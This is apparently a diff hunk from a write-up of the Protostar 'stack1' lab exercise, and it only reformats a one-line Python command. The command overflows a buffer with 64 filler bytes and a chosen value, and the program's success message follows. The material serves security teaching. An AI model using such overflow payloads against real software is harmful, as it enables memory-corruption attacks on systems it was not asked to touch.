@@ -53,7 +53,7 @@ user@protostar:/opt/protostar/bin$
 ```
 
 ```sh
-user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'A'*64 + '\x64\x63\x62\x61' " `
+user@protostar:/opt/protostar/bin$ ./stack1 `python -c "print 'A'*64 +'\x64\x63\x62\x61'"`
 you have correctly got the variable to the right value
 user@protostar:/opt/protostar/bin$
 ```
